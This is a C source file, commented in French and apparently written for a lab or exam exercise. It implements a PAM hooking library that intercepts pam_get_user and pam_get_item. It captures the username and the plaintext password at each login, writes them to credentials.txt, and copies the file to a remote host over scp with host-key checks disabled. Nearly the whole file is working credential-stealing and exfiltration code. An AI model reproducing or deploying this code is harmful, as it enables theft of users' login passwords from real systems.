#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>

typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

// Fonction pour obtenir l'heure actuelle en tant que chaîne
const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

// Fonction pour écrire dans le fichier credentials.txt
void write_to_file(const char *filepath, const char *type, const char *data) {
    FILE *file = fopen(filepath, "a");
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier credentials.txt");
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);

    fprintf(stderr, "[DEBUG] Ecriture dans %s effectuée\n", filepath);
}

// Fonction pour envoyer le fichier via SCP
void send_file_scp(const char *filepath, const char *remote_user, const char *remote_host, const char *remote_path) {
    char command[512];
    snprintf(command, sizeof(command),
             "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s %s@%s:%s 2> /tmp/scp_debug.log",
             filepath, remote_user, remote_host, remote_path);
    int ret = system(command);
    if (ret != 0) {
        fprintf(stderr, "[ERROR] SCP a échoué. Vérifiez /tmp/scp_debug.log pour les détails. Commande : %s\n", command);
    } else {
        fprintf(stderr, "[DEBUG] Fichier %s envoyé à %s@%s:%s\n", filepath, remote_user, remote_host, remote_path);
    }
}

// Intercepteur pour pam_get_item
int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    static int password_logged = 0;
    static pam_get_item_t original_pam_get_item = NULL;

    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "Impossible de localiser pam_get_item : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_item(pamh, item_type, item);
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item && !password_logged) {
        const char *file_path = "/home/kali/Partiel_C/credentials.txt";
        char local_buffer[256];
        strncpy(local_buffer, (const char *)*item, sizeof(local_buffer) - 1);
        local_buffer[sizeof(local_buffer) - 1] = '\0';
        write_to_file(file_path, "Mot de passe", local_buffer);
        password_logged = 1;
        send_file_scp(file_path, "ybookpro", "192.168.1.4", "/Users/ybookpro/Desktop/credentials.txt");
    }
    return retval;
}

// Intercepteur pour pam_get_user
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    static int user_logged = 0;
    static pam_get_user_t original_pam_get_user = NULL;

    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "Impossible de localiser pam_get_user : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_user(pamh, user, prompt);
    if (retval == PAM_SUCCESS && *user && !user_logged) {
        const char *file_path = "/home/kali/Partiel_C/credentials.txt";
        write_to_file(file_path, "Login", *user);
        user_logged = 1;
        send_file_scp(file_path, "ybookpro", "192.168.1.4", "/Users/ybookpro/Desktop/credentials.txt");
    }
    return retval;
}
